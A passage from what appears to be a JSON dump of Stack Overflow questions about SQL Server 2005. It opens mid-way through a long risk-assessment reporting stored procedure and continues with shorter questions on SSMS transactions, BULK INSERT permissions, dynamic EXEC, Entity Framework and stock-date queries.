TgtRskID,rasId,ramaltName,ramaltColour,TgtRAMDescr,TgtRAMLikDescr,TgtRAMImpScr,TgtRAMLikScr\n,LastScore  , AnnualExposure,curCode, TgtOverallExp,TgtFrequency,RiskLastAssessment FROM (\n    SELECT \n          RA.rasRiskId AS TgtRskID\n         ,RA.rasId \n         ,RM.ramaltName\n         ,RM.ramaltColour \n         ,isnull(RI.ramimpDescription,'') AS TgtRAMDescr\n         ,isnull(RL.ramlikDescription,'') AS TgtRAMLikDescr\n         ,isnull(RA.rasRAMImpactScore,0)  AS TgtRAMImpScr\n         ,isnull(RA.rasRAMLikelihoodScore,0) AS TgtRAMLikScr\n         ,isnull(dbo.RiskAssessmentLastScore(RA.rasRiskId, 'I'),0) AS LastScore\n        ,ISNULL(RA.rasExposureHO * (RA.rasRAMLikFreqEntered / 100), 0) / 1000 AS AnnualExposure\n        ,RCU.curCode \n        ,RA.rasExposure as TgtOverallExp\n        ,RA.rasRAMLikFreqEntered as TgtFrequency\n        ,RA.rasAssessmentDate as RiskLastAssessment         \n    FROM     RAMImpacts RI\n    INNER JOIN RiskAssessment RA\n    ON       RI.ramimpScore = RA.rasRAMImpactScore\n          AND RI.ramimpRAMId = RA.rasRAMId\n    INNER JOIN Risks R\n    ON       R.rskId = RA.rasRiskId\n    INNER JOIN @MainFilter MF\n    ON       MF.rskId = R.rskId\n    INNER JOIN RAMALTs RM\n    ON       RA.rasRAMId = RM.ramaltRAMId\n          AND RA.rasRAMALTAmount = RM.ramaltAmount\n    INNER JOIN RAMLikelihoods RL\n    ON       RA.rasRAMLikelihoodScore = RL.ramlikScore\n          AND RA.rasRAMId = RL.ramlikRAMId\n    LEFT OUTER JOIN RAM RMS \n    ON      RA.rasRAMId = RMS.ramId \n    LEFT OUTER JOIN Currencies RCU \n    ON      RMS.ramCurrencyId = RCU.curId\n    WHERE    (RA.rasType = 'T') )\n    A --WHERE A.RiskLastAssessment IN \n        INNER  JOIN (SELECT MAX(RAouter.rasAssessmentDate)as rasAssessmentDate,RAouter.rasRiskid FROM  RiskAssessment RAouter \n            --WHERE RAouter.rasAssessmentDate &lt;= @LastAssDate \n                Group by RAouter.rasRiskid) B \n    ON A.RiskLastAssessment = B.rasAssessmentDate and A.TgtRskID = B.rasRiskid\n\n\n    --Inherent data\n    INSERT INTO @Inh\n\n    SELECT InhRskID,rasId,ramaltName,ramaltColour,InhRAMDescr,InhRAMLikDescr,InhRAMImpScr,InhRAMLikScr,LastScore,AnnualExposure,curCode,\n            InhOverallExp,InhFrequency,RiskLastAssessment FROM (\n    SELECT RA.rasRiskId AS InhRskID\n         ,RA.rasId\n         ,RM.ramaltName\n         ,RM.ramaltColour\n         ,isnull(RI.ramimpDescription,'') AS InhRAMDescr\n         ,isnull(RL.ramlikDescription,'') AS InhRAMLikDescr\n         ,isnull(RA.rasRAMImpactScore,0)  AS InhRAMImpScr\n         ,isnull(RA.rasRAMLikelihoodScore,0) AS InhRAMLikScr\n         ,isnull(dbo.RiskAssessmentLastScore(RA.rasRiskId, 'I'),0) AS LastScore\n        ,ISNULL(RA.rasExposureHO * (RA.rasRAMLikFreqEntered / 100), 0) / 1000 AS AnnualExposure\n        ,RCU.curCode\n        ,RA.rasExposure as InhOverallExp\n        ,RA.rasRAMLikFreqEntered as InhFrequency \n        ,RA.rasAssessmentDate as RiskLastAssessment\n    FROM     RAMImpacts RI\n    INNER JOIN RiskAssessment RA\n    ON       RI.ramimpScore = RA.rasRAMImpactScore\n          AND RI.ramimpRAMId = RA.rasRAMId\n    INNER JOIN Risks R\n    ON       R.rskId = RA.rasRiskId\n    INNER JOIN @MainFilter MF\n    ON       MF.rskId = R.rskId\n    INNER JOIN RAMALTs RM\n    ON       RA.rasRAMId = RM.ramaltRAMId\n          AND RA.rasRAMALTAmount = RM.ramaltAmount\n    INNER JOIN RAMLikelihoods RL\n    ON       RA.rasRAMLikelihoodScore = RL.ramlikScore\n          AND RA.rasRAMId = RL.ramlikRAMId\n    LEFT OUTER JOIN RAM RMS \n    ON      RA.rasRAMId = RMS.ramId \n    LEFT OUTER JOIN Currencies RCU \n    ON      RMS.ramCurrencyId = RCU.curId\n    WHERE    (RA.rasType = 'I'))--          AND (RA.rasIsLatest = 'Y')\n    A --WHERE A.RiskLastAssessment IN \n        INNER  JOIN (SELECT MAX(RAouter.rasAssessmentDate)as rasAssessmentDate,RAouter.rasRiskid FROM  RiskAssessment RAouter \n            --WHERE RAouter.rasAssessmentDate &lt;= @LastAssDate \n                Group by RAouter.rasRiskid) B \n    ON A.RiskLastAssessment = B.rasAssessmentDate and A.InhRskID = B.rasRiskid\n\n\n    --Residual data\n    INSERT   INTO @Res\n    SELECT ResRskID,rasId,ramaltName,ramaltColour,ResRAMDescr,ResRAMLikDescr,ResRAMImpScr,ResRAMLikScr,LastScore,AnnualExposure,curCode,\n            ResOverallExp,ResFrequency,RiskLastAssessment  FROM(\n    SELECT   RA.rasRiskId AS ResRskID\n         ,RA.rasId\n         ,RM.ramaltName\n         ,RM.ramaltColour\n         ,isnull(RI.ramimpDescription,'') AS ResRAMDescr\n         ,isnull(RL.ramlikDescription,'') AS ResRAMLikDescr\n         ,isnull(RA.rasRAMImpactScore,0)  AS ResRAMImpScr\n         ,isnull(RA.rasRAMLikelihoodScore,0) AS ResRAMLikScr\n         ,isnull(dbo.RiskAssessmentLastScore(RA.rasRiskId, 'R'),0) AS LastScore\n        ,ISNULL(RA.rasExposureHO * (RA.rasRAMLikFreqEntered / 100), 0) / 1000 AS AnnualExposure\n        ,RCU.curCode \n        ,RA.rasExposure as ResOverallExp\n        ,RA.rasRAMLikFreqEntered as ResFrequency\n        ,RA.rasAssessmentDate as RiskLastAssessment\n\n    FROM     RAMImpacts RI\n    INNER JOIN RiskAssessment RA\n    ON       RI.ramimpScore = RA.rasRAMImpactScore\n          AND RI.ramimpRAMId = RA.rasRAMId\n    INNER JOIN Risks R\n    ON       R.rskId = RA.rasRiskId\n    INNER JOIN @MainFilter MF\n    ON       MF.rskId = R.rskId\n    INNER JOIN RAMALTs RM\n    ON       RA.rasRAMId = RM.ramaltRAMId\n          AND RA.rasRAMALTAmount = RM.ramaltAmount\n    INNER JOIN RAMLikelihoods RL\n    ON       RA.rasRAMLikelihoodScore = RL.ramlikScore\n          AND RA.rasRAMId = RL.ramlikRAMId\n    LEFT OUTER JOIN RAM RMS \n    ON      RA.rasRAMId = RMS.ramId \n    LEFT OUTER JOIN Currencies RCU \n    ON      RMS.ramCurrencyId = RCU.curId\n    WHERE    (RA.rasType = 'R'))--  AND (RA.rasIsLatest = 'Y')\n     A --WHERE A.RiskLastAssessment IN \n        INNER  JOIN (SELECT MAX(RAouter.rasAssessmentDate)as rasAssessmentDate,RAouter.rasRiskid FROM  RiskAssessment RAouter \n            --WHERE RAouter.rasAssessmentDate &lt;= @LastAssDate \n                Group by RAouter.rasRiskid) B \n    ON A.RiskLastAssessment = B.rasAssessmentDate and A.ResRskID = B.rasRiskid  \n\n    -- Risk Data to display on report   \n    INSERT   INTO @RiskData\n    SELECT   RA.rasRAMImpactScore * RA.rasRAMLikelihoodScore AS RAMScore\n        ,ISNULL(RA.rasExposureHO * (RA.rasRAMLikFreqEntered / 100), 0) / 1000 AS AnnExp -- Required for sorting.\n        ,RSK.rskId\n        ,dbo.RiskPrefixId(RSK.rskId) AS RiskID\n        ,isnull(RSK.rskDescription,'')\n        ,isnull(SUBSTRING(RSK.rskLongDesc, 1, 4000),'') AS LongDesc\n        ,CASE WHEN YEAR(RSK.rskAssNext) &lt;= 1900\n            THEN NULL \n            ELSE CONVERT(VARCHAR(9), RSK.rskAssNext, 6) \n         END as RiskAssessmentDate\n        ,RAM.RAMName\n        ,RSK.rskRAMId\n        ,RSK.rskRiskProfile\n        ,RP.rwkDesc + ': ' + dbo.EntityPrefixId(RSK.rskRiskProfile) AS EntityInfo\n        ,isnull(dbo.FULLNAME(RSK.rskOwner),'...') AS OwnerName\n        ,isnull(dbo.FULLNAME(RSK.rskNomineeId),'...') AS NomineeName\n        ,isnull(dbo.FULLNAME(RSK.rskReviewer),'...') AS ReviewerName\n        ,T.rasId AS TgtRasId\n        ,T.RAMName AS TgtRamName\n        ,T.RAMColour AS  TgtRamColour\n        ,T.RAMImpDesc AS TgtRamImpDesc\n        ,T.RAMLikDesc AS TgtRamLikDesc\n        ,isnull(T.RAMImpScore,0) AS TgtRamImpScore\n        ,isnull(T.RAMLikScore,0) AS TgtRamLikScore\n        ,isnull(T.LastScore,0) AS TgtLastScore      \n        ,isnull(T.AnnualExposure,0.00) AS TgtAnnualExp\n        ,T.Currency as TgtCurrency\n        ,I.rasId AS InhRasId\n        ,I.RAMName AS InhRamName\n        ,I.RAMColour AS InhRamColour\n        ,I.RAMImpDesc AS InhRamImpDesc\n        ,I.RAMLikDesc AS InhRamLikDesc\n        ,isnull(I.RAMImpScore,0) AS InhRamImpScore\n        ,isnull(I.RAMLikScore,0) AS InhRamLikScore\n        ,isnull(I.LastScore,0) AS InhLastScore\n        ,isnull(I.AnnualExposure,0.00) AS InhAnnualExp\n        ,I.Currency as InhCurrency\n        ,R.rasId AS RsdRasId\n        ,R.RAMName AS RsdRamName\n        ,R.RAMColour AS RsdRamColour\n        ,R.RAMimpDesc AS RsdRamImpDesc\n        ,R.RAMlikDesc AS RsdRamLikDesc\n        ,isnull(R.RAMImpScore,0) AS RsdRamImpScore\n        ,isnull(R.RAMLikScore,0) AS RsdRamLikScore\n        ,isnull(R.LastScore,0) AS RsdLastScore\n        ,isnull(R.AnnualExposure,0.00) AS RsdAnnualExp\n        ,R.Currency as RsdCurrency\n        ,MF.fcaName\n        ,MF.fctName\n        ,dbo.CRRPrefixId(CRR.CrrId) AS CCRId\n        ,isnull(CRR.crrDescription,'') \n        ,CASE WHEN ISNULL(RA.rasid,0) = 0 THEN 'N' Else 'Y' END AS Assessed \n        ,CASE WHEN UPPER((RA.rasstatus)) = 'A' THEN 'Y' ELSE 'N' END AS Attested    \n        ,@DisplayAction         \n        ,OP.OpModelName as TopLevelOpModel\n        ,RSK.rskSeverity as RiskSeverity\n        ,TRC.topRiskCat as TopLevelRiskCat\n        ,Isnull(T.OverallExp/1000,0) as TgtOverallExp\n        ,Isnull(T.Frequency,0) as TgtFrequency\n        ,IsNUll(I.OverallExp/1000,0) as InhOverallExp\n        ,ISNUll(I.Frequency,0) as InhFrequency \n        ,IsNUll(R.OverallExp/1000,0) as ResOverallExp\n        ,Isnull(R.Frequency,0) as ResFrequency              \n    FROM     Risks RSK\n    INNER JOIN @MainFilter MF\n    ON       MF.rskId = RSK.rskId\n    INNER JOIN RiskProfiles RP\n    ON       RSK.rskRiskProfile = RP.rwkReference\n    INNER JOIN RAM\n    ON       RP.rwkRAMID = RAM.ramId\n    LEFT OUTER JOIN CentralRiskRegister CRR\n    ON       CRR.crrId = RSK.rskCRRId   -- Added on 03/Jan/08\n    LEFT OUTER JOIN RiskAssessment RA\n    ON       RSK.rskId = RA.rasRiskId\n     AND RA.rasIsLatest = 'Y'\n      AND RA.rasType = CASE WHEN @RsdlInh = '1'  THEN 'R'\n                            WHEN @RsdlInh = '2'  THEN 'I'\n                            ELSE 'T'\n                       END\n    LEFT OUTER JOIN @Tgt T\n    ON       RSK.rskId = T.rasRiskId\n    LEFT OUTER JOIN @Inh I\n    ON       RSK.rskId = I.rasRiskId\n    LEFT OUTER JOIN @Res R\n    ON       RSK.rskId = R.rasRiskId\n    LEFT OUTER JOIN @OpModels OP\n    ON      RSK.rskId = OP.rskid\n    LEFT OUTER JOIN @TopRiskCat TRC\n    ON      RSk.rskid = TRC.rskid       \n    WHERE    RSK.rskRelevant = 'Y'\n\n\n-- Get Risk data in descending order of Severity\n    INSERT INTO @TopRiskSort\n    select distinct AnnExp,rskId,severity\n    FROM @RiskData\n    Order BY Severity desc;\n    --Order BY AnnExp desc;\n\n    --If @TopN values is 0 take all the recods\n    IF @TopN = 0 \n    BEGIN\n        INSERT INTO @TopRisk\n        select   AnnExp\n                ,rskId\n                ,severity\n        from @TopRiskSort \n    END\n    ELSE\n    BEGIN   -- Else \n        INSERT INTO @TopRisk\n        select   AnnExp\n                ,rskId\n                ,severity \n        from @TopRiskSort\n        where RdRecId &lt;= @topn;\n    END\n\n\n    --Controls for the above Risks\n    INSERT INTO @RiskCtrl\n    SELECT RD.rskId\n        ,RC.rcnId\n        ,dbo.RiskControlPrefixId(RC.rcnId) + ':' + rcnShortDescr AS ControlInfo\n        ,(SELECT efid FROM Effectiveness WHERE efId = CA.rcaEffectiveness) AS Performance --ACCR-1327\n        ,(SELECT adid FROM Adequacy WHERE adId = CA.rcaAdequacy) AS Design          ,dbo.FULLNAME(RC.rcnOwnerId) AS ControlOwner\n        ,dbo.FULLNAME(RC.rcnNomineeId) AS ControlNominee\n        ,dbo.FULLNAME(RC.rcnReviewerId) AS ControlReviewer\n    FROM @TopRisk TR        \n        LEFT OUTER JOIN @RiskData RD ON RD.rskId=TR.rskId\n        LEFT OUTER JOIN RiskControls RC ON RC.rcnRiskId = RD.rskId\n        LEFT OUTER JOIN RiskCtrlAss CA ON RC.rcnId = CA.rcaRiskCtrlId\n    WHERE (ISNULL(CA.rcaId, 0) = (SELECT IsNull(MAX(RA.rcaId), 0) FROM RiskCtrlAss RA \n                                    WHERE RA.rcaRiskCtrlId = RC.rcnId))\n\n\n    --Risk and Risk Controls Actions\n    INSERT INTO @ACTIONS\n    -- Risk Actions fro all the risks in @RiskData table\n    SELECT A.actOwningId AS ActionRiskId\n        ,NULL AS ControlID\n        ,CASE WHEN (YEAR(A.actTargetDate) &gt; 1900)\n                AND (\n\n                      A.actState = 4\n                    )\n           THEN CONVERT (VARCHAR(9), A.actTargetDate, 6)\n           ELSE NULL\n        END \n        AS actTgtCompleteDate\n        ,CASE WHEN (YEAR(A.actTargetDate) &gt; 1900)\n                AND (A.actState &lt; 3)\n                AND (A.actTargetDate &lt;= @ThisDate)\n           THEN CONVERT (VARCHAR(9), A.actTargetDate, 6)\n           ELSE NULL\n        END AS actTgtODueDate\n        ,CASE WHEN (YEAR(A.actTargetDate) &gt; 1900)\n                AND (A.actState &lt; 3)\n                AND (A.actTargetDate &lt;= @ThisDate)\n           THEN NULL --'overdue'\n           WHEN YEAR(A.actTargetDate) &gt; 1900\n                AND (\n                     A.actState = 3\n                     OR A.actState = 4\n                    ) THEN NULL --'complete'\n           WHEN YEAR(A.actTargetDate) &lt;= 1900\n           THEN NULL\n           ELSE CONVERT(VARCHAR(9), A.actTargetDate, 6)\n        END AS RATgtDate\n        ,dbo.FULLNAME(A.actNomineeId) AS ActNominee         \n        ,dbo.FULLNAME(A.actOwnerId) AS ActOwner         \n        ,A.actCompletionAmount AS CompletionAmount          \n        ,isnull((CASE A.actOwningTableNum\n        WHEN 2 THEN dbo.RiskControlPrefixId(A.actOwningId)+ '/' + dbo.ActionPrefixId(A.actId)+ ':' + Cast(actCommentary as Varchar(MAX))\n        WHEN 3 THEN dbo.ActionPrefixId(A.actId) + ':' + Cast(actCommentary as Varchar(MAX)) END),'') AS ActionDetail\n            ,actOwningTableNum AS AType\n        ,dbo.[ActionStatusStr](A.actState)  \n    FROM Actions A\n        INNER JOIN @RiskData RD ON RD.rskId = A.actOwningId\n        INNER JOIN @TopRisk TR ON TR.rskId = A.actOwningId\n    WHERE    A.actOwningTableNum = 3\n        AND (A.actState &lt; 4) AND (A.actstate != 3)\n\n    UNION\n\n    -- Risk Control  Actions for all the risk controls in @RiskCtrl table\n    SELECT   RC.rcnRiskId AS ActionRiskId\n        ,RC.rcnId AS ControlID\n        ,CASE WHEN (YEAR(A.actTargetDate) &gt; 1900)\n                AND (\n                    -- A.actState &gt; 2                        AND \n                        A.actState &lt;= 4\n                    )\n           THEN CONVERT (VARCHAR(9), A.actTargetDate, 6)\n           ELSE NULL\n        END \n        AS actTgtCompleteDate\n        ,CASE WHEN (YEAR(A.actTargetDate) &gt; 1900)\n                AND (A.actState &lt; 3)\n                AND (A.actTargetDate &lt;= @ThisDate)\n           THEN CONVERT (VARCHAR(9), A.actTargetDate, 6)\n           ELSE NULL\n        END AS actTgtCompleteDate\n        ,CASE WHEN (YEAR(A.actTargetDate) &gt; 1900)\n                AND (A.actState &lt; 3)\n                AND (A.actTargetDate &lt;= @ThisDate)\n           THEN NULL --'overdue'\n           WHEN YEAR(A.actTargetDate) &gt; 1900\n                AND (\n                     A.actState = 3\n                     OR A.actState = 4\n                    ) THEN NULL --'compete'\n           WHEN YEAR(A.actTargetDate) &lt;= 1900\n           THEN NULL\n           ELSE CONVERT (VARCHAR(9), A.actTargetDate, 6)\n        END AS RATgtDate\n        ,dbo.FULLNAME(actNomineeId) AS ActNominee\n        ,dbo.FULLNAME(actOwnerId) AS ActOwner           \n        ,A.actCompletionAmount AS CompletionAmount\n        ,CASE A.actOwningTableNum\n        WHEN 2 THEN dbo.RiskControlPrefixId(A.actOwningId) + '/' + dbo.ActionPrefixId(A.actId) + ':' + Cast(actCommentary as Varchar(MAX))\n                       WHEN 3 THEN dbo.ActionPrefixId(A.actId) + ':' + Cast(actCommentary as Varchar(MAX)) END AS ActionDetail\n        -- A.actDescription END AS ActionDetail             ,actOwningTableNum AS AType\n        ,dbo.[ActionStatusStr](A.actState)\n    FROM     Actions A\n        RIGHT OUTER JOIN RiskControls RC\n        ON       A.actOwningId = RC.rcnId\n        INNER JOIN @RiskCtrl TRC\n        ON       TRC.rcnRiskId = RC.rcnRiskId\n    WHERE    (A.actOwningTableNum = 2)\n        AND (A.actState &lt; 4) AND (A.actstate != 3)\n\n\n\n    IF (@RsdlInh = '1') \n</code></pre>\n\n<p>BEGIN   </p>\n\n<p>SELECT   RD.* \n                ,NULL AS rcnId\n                ,NULL AS ControlInfo\n                ,NULL AS Performance\n                ,NULL AS Design\n                ,NULL AS ControlOwner\n                ,NULL AS ControlNominee\n                ,NULL AS ControlReviewer\n                ,A.*<br>\n        FROM     @RiskData RD\n            INNER JOIN @TopRisk TR ON TR.rskId=RD.rskId\n            LEFT OUTER JOIN @ACTIONS A\n            ON       (\n                      RD.rskid = A.ActionRiskId\n                      AND A.AType = 3\n                     )\n                UNION\n        SELECT   RD.*\n                ,RC.rcnId\n                ,RC.ControlInfo\n                ,RC.Performance\n                ,RC.Design\n                ,RC.ControlOwner\n                ,RC.ControlNominee\n                ,RC.ControlReviewer\n                ,A.*<br>\n        FROM     @RiskData RD\n        INNER JOIN @TopRisk TR ON TR.rskId=RD.rskId\n        INNER JOIN @RiskCtrl RC ON RD.rskId = RC.rcnRiskId\n        LEFT OUTER JOIN @ACTIONS A\n        ON       (\n                  A.AType = 2\n                  AND RC.rcnId = A.ControlID\n                 )<br>\n                    ORDER BY RD.RsdAnnualExp DESC \nEND</p>\n\n<p>IF (@RsdlInh = '2') \nBEGIN   </p>\n\n<p>SELECT   RD.* \n                ,NULL AS rcnId\n                ,NULL AS ControlInfo\n                ,NULL AS Performance\n                ,NULL AS Design\n                ,NULL AS ControlOwner\n                ,NULL AS ControlNominee\n                ,NULL AS ControlReviewer\n                ,A.*<br>\n        FROM     @RiskData RD\n            INNER JOIN @TopRisk TR ON TR.rskId=RD.rskId\n            LEFT OUTER JOIN @ACTIONS A\n            ON       (\n                      RD.rskid = A.ActionRiskId\n                      AND A.AType = 3\n                     )\n                UNION\n        SELECT   RD.*\n                ,RC.rcnId\n                ,RC.ControlInfo\n                ,RC.Performance\n                ,RC.Design\n                ,RC.ControlOwner\n                ,RC.ControlNominee\n                ,RC.ControlReviewer\n                ,A.*<br>\n        FROM     @RiskData RD\n        INNER JOIN @TopRisk TR ON TR.rskId=RD.rskId\n        INNER JOIN @RiskCtrl RC ON RD.rskId = RC.rcnRiskId\n        LEFT OUTER JOIN @ACTIONS A\n        ON       (\n                  A.AType = 2\n                  AND RC.rcnId = A.ControlID\n                 )<br>\n                    ORDER BY RD.InhAnnualExp DESC \nEND</p>\n\n<p>IF (@RsdlInh = '3') \nBEGIN   </p>\n\n<p>SELECT   RD.* \n                ,NULL AS rcnId\n                ,NULL AS ControlInfo\n                ,NULL AS Performance\n                ,NULL AS Design\n                ,NULL AS ControlOwner\n                ,NULL AS ControlNominee\n                ,NULL AS ControlReviewer\n                ,A.*<br>\n        FROM     @RiskData RD\n            INNER JOIN @TopRisk TR ON TR.rskId=RD.rskId\n            LEFT OUTER JOIN @ACTIONS A\n            ON       (\n                      RD.rskid = A.ActionRiskId\n                      AND A.AType = 3\n                     )\n                UNION\n        SELECT   RD.*\n                ,RC.rcnId\n                ,RC.ControlInfo\n                ,RC.Performance\n                ,RC.Design\n                ,RC.ControlOwner\n                ,RC.ControlNominee\n                ,RC.ControlReviewer\n                ,A.*<br>\n        FROM     @RiskData RD\n        INNER JOIN @TopRisk TR ON TR.rskId=RD.rskId\n        INNER JOIN @RiskCtrl RC ON RD.rskId = RC.rcnRiskId\n        LEFT OUTER JOIN @ACTIONS A\n        ON       (\n                  A.AType = 2\n                  AND RC.rcnId = A.ControlID\n                 )<br>\n                    ORDER BY RD.RsdAnnualExp DESC </p>\n\n<p>END</p>\n\n<p>Please help!!</p>\n\n<p>Thanks in advance</p>\n"},{"tags":["sql-server","sql-server-2005","tsql"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":422,"score":1,"question_id":5378357,"title":"Error: There are uncommitted transactions","body":"<p>I open a new window in SSMS and run this:</p>\n\n<pre><code>SET ANSI_DEFAULTS ON \nGO\n\nCREATE PROCEDURE [dbo].[zzz_test2]\n(\n    @a    int\n)\nAS\n    SET NOCOUNT ON\n    SET @a=1\n    RETURN 0\nGO\n</code></pre>\n\n<p>and then close the window, which results in this warning:</p>\n\n<p><code>There are uncommitted transactions. Do you wish to commit these before closing the window?</code></p>\n\n<p>what is going on??</p>\n\n<p>when I open a new SSMS window and run this:</p>\n\n<pre><code>SET ANSI_NULLS  ON  \nGO    \n\nCREATE PROCEDURE [dbo].[zzz_test2]\n(\n    @a    int\n)\nAS\n    SET NOCOUNT ON\n    SET @a=1\n    RETURN 0\nGO\n</code></pre>\n\n<p>and close the window, I get no warning.</p>\n"},{"tags":["winforms","sql-server-2005","bulkinsert"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":77,"score":0,"question_id":12730206,"title":"SQL server BULK INSERT fails, with access denied error","body":"<p>I am trying to do a <code>BULK INSERT</code> from a CSV file into SQL Server 2005 through a Windows application. Now the application uses SQL Server authentication.</p>\n\n<p>When the user tries to upload a file from file server, it's giving the following exception</p>\n\n<blockquote>\n  <p><em>Cannot bulk load because the file \"\\shared\\data.csv \" could not be opened. Operating system error code 5(Access is denied.)</em></p>\n</blockquote>\n\n<p><a href=\"http://stackoverflow.com/questions/852117/bulk-insert-error-with-unc-path-and-windows-authentication/855896#855896%20http://thesqldude.com/2011/12/30/how-to-sql-server-bulk-insert-with-constrained-delegation-access-is-denied/\">Found this query raised earlier</a> and <a href=\"http://thesqldude.com/2011/12/30/how-to-sql-server-bulk-insert-with-constrained-delegation-access-is-denied/\" rel=\"nofollow\">this</a> post, but both of them talks about the case were Windows authentication is used (which is not the case here). DBA here strictly does not allow permission for SQL service account for the shared folder citing security violations</p>\n\n<p>Appreciate any help or guidance</p>\n"},{"tags":["sql","sql-server","sql-server-2008","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":59,"score":0,"question_id":12726098,"title":"increase counter while using exec","body":"<p>I want to use a counter in a way like the below one:</p>\n\n<pre><code>exec\n('begin insert into ' + @temp07 + ' (FileID,FileName)\nSelect aof_id,aof_fileName from PaFi07(' + @partId + ');\n\nsp_executesql @sqlCounter, N'@intCount int output, @intConst int,  @intCount = @intCount output,  @intConst = @intConst \nend')\n</code></pre>\n\n<p>so how can i let the counter work?</p>\n\n<p>any suggestion that the counter work inside this EXEC command\nTHANX</p>\n"},{"tags":["tsql","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":48,"score":1,"question_id":12726090,"title":"Cant use LIKE but need to find related records in SQL Server","body":"<p>I've got a table used for issue tracking (kind of like stackoverflow :) to log PC related issues) and for simplicity I'll narrow it down to a few fields, something like the following:</p>\n\n<pre><code>Site               Category          Issue\nMI Office          Software          My MS word does not run macros.\nCL Office          Hardware          PC memory needs to be upgraded\nMX Office          Printer           Printer is out of memory.\nMI Office          Software          Office product prompts for allowing macro to run\n</code></pre>\n\n<p>I want to find related issues when I am looking at for instance one issue.  I can't really use the <code>LIKE</code> operator as for instance if I do:</p>\n\n<p><code>SELECT...FROM...WHERE Issue LIKE '%My MS word does not run macros.%'</code></p>\n\n<p>Would only return the first record.  Do I have to figure out how to pull key words like \"Macros\" ?  How would I find related records so that my query for instance could return records 1 and 4.  Or return 2 and 3 together?</p>\n"},{"tags":["sql-server-2008","entity-framework","sql-server-2005","stored-procedures"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":61,"score":0,"question_id":12720738,"title":"Stored procedure execution in Entity Framework in SQL Server 2005","body":"<p>I am using MVC3 and Entity Framework for calling a stored procedure in SQL Server 2008. The procedure has no parameters and in the profiler I get the proc execution as</p>\n\n<pre><code>exec sp_executesql N'sp_GetDashSessionboardRoomTimeSlot', N'@p0 nvarchar(4000)', @p0=NULL\n</code></pre>\n\n<p>This is how I call in the c# code.</p>\n\n<pre><code>SqlParameter sa = null;\nvar query = from dashboardData in TBSCIDBContext.Database.SqlQuery&lt;SessionDashboardData&gt;(\"sp_GetDashSessionboardRoomTimeSlot\", sa)\n            select dashboardData;\n</code></pre>\n\n<p>This works fine. But I have changed my database to SQL Server 2005 and I need to use it </p>\n\n<p>So when I call the same procedure using the same C# code the profiler returns the same exec statement but the sql gives error </p>\n\n<blockquote>\n  <p>Incorrect syntax near 'sp_GetDashSessionboardRoomTimeSlot'</p>\n</blockquote>\n\n<p>pls help me in how to fix this problem as I need to use this stored procedure and in SQL Server 2005</p>\n"},{"tags":["xml","sql-server-2008","tsql","sql-server-2005","validation"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":41,"score":0,"question_id":12724440,"title":"SQL Server :  validate XML","body":"<p>I'm using SQL Server 2005 and 2008 and am trying to import a variety different XML files into my db, and occasionally the XML is not valid. Each XML file will differ from the last.</p>\n\n<p>Is there any way to create a function which will return 0 or 1 depending on whether the XML is valid?</p>\n\n<p>Thanks</p>\n\n<p>C</p>\n"},{"tags":["sql-server-2008","sql-server-2005"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":28,"score":1,"question_id":12723098,"title":"Synchronise tables in sql","body":"<p>I got 7 tables in sql server 2005 having relation with each other based on primary key and foreign keys. I need to make a new table which will contain columns of all the 7 tables together. I need this new table to be synchronised every time with the main 7 tables. What is the best way to do this in Sql server 2005 or 2008..</p>\n"},{"tags":["sql","tsql","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":44,"score":0,"question_id":12722728,"title":"Query to find the first date after a specific grouped sum value","body":"<p>I have an article table that holds the current stock for each article. I need to know the last date when new stock has arrived, after running out of stock for that specific article.</p>\n\n<p>The table looks like this.</p>\n\n<pre><code>+-----------+-----------------+-------+\n| ArticleID |    StockDate    | Stock |\n+-----------+-----------------+-------+\n|         1 | 1/1/2012 10:15  |   100 |\n|         1 | 2/1/2012 13:39  |   -50 |\n|         1 | 2/1/2012 15:17  |   -50 |\n|         1 | 4/1/2012 08:05  |   100 |\n|         2 | 5/1/2012 09:48  |    50 |\n|         1 | 6/1/2012 14:21  |   -25 |\n|         1 | 7/1/2012 16:01  |    10 |\n|         2 | 8/1/2012 13:42  |   -10 |\n|         1 | 9/1/2012 09:56  |   -85 |\n|         1 | 13/1/2012 08:12 |   100 |\n|         1 | 13/1/2012 10:50 |   -15 |\n+-----------+-----------------+-------+\n</code></pre>\n\n<p>The output should look like this.</p>\n\n<pre><code>+-----------+-----------------+\n| ArticleID |    StockDate    |\n+-----------+-----------------+\n|         2 | 5/1/2012 09:48  |\n|         1 | 13/1/2012 08:12 |\n+-----------+-----------------+\n</code></pre>\n\n<p>How did i get this output? ArticleID 1 had a 100 in stock but reached 0 for the first time on 2/1/2012 15:17. Then new stock arrived and it hit 0 again at 9/1/2012 09:56. So the result should shows the first date after the last empty stock grouped by ArticleID. ArticleID 2 didn't had a 0 point, so the first stock date is shown.</p>\n\n<p>I need a result set that can be joined with other queries. So a Stored Procedure does not work for me.</p>\n"},{"tags":[".net","sql-server-2005","entity-framework"],"answer_count":2,"favorite_count":2,"up_vote_count":4,"down_vote_count":0,"view_count":1706,"score":4,"question_id":3266295,"title":".Net Entity Framework and Transactions","body":"<p>Being new to the EF, I'm really rather stuck on how to proceed with this set of issues. On the project I am currently working on, the entire site is heavily integrated with the EF model. At first, the access to the EF context was being controlled using an IOC bootstrapper. For operational reasons we were not able to use IOC. I removed this and used a model of individual instances of the context object where required. I started getting the following exception:</p>\n\n<p><code>The type 'XXX' has been mapped more than once.</code></p>\n\n<p>We came to the conclusion that the different instances of the context were causing this issue. I then abstracted the context object into a single static instance which was being accessed by each thread/page. I'm now getting one of several exceptions about transactions:</p>\n\n<p><code>New transaction is not allowed because there are other threads running in the session.</code></p>\n\n<p><code>The transaction operation cannot be performed because there are pending requests working on this transaction.</code></p>\n\n<p><code>ExecuteReader requires the command to have a transaction when the connection assigned to the command is in a pending local transaction. The Transaction property of the command has not been initialized.</code></p>\n\n<p>The last of these exceptions occurred on a load operation. I wasn't trying to save the context state back to the Db on the thread that failed. There was another thread performing such an operation however.</p>\n\n<p>These exceptions are intermittent at best, but I have managed to get the site to go into a state where new connections were refused due to a transaction 